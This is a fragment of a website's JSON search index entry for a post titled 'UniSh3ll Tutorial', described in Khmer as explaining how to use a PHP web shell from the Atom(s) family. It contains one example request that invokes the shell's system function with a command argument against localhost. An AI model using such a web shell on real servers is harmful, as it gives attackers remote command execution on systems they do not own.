\u0026#39;127.0.0.1:8080/unish3ll.php?0=system\u0026amp;1=la+-la\u0026#39;    ","description":"របៀបប្រើប្រាស់ Unish3ll គ្រួសាររបស់ Atom(s) Web Shell","id":17,"section":"posts","tags":["php-webshell"],"title":"UniSh3ll Tutorial","uri":"https://thiklab.com/en/posts/unishell/"}]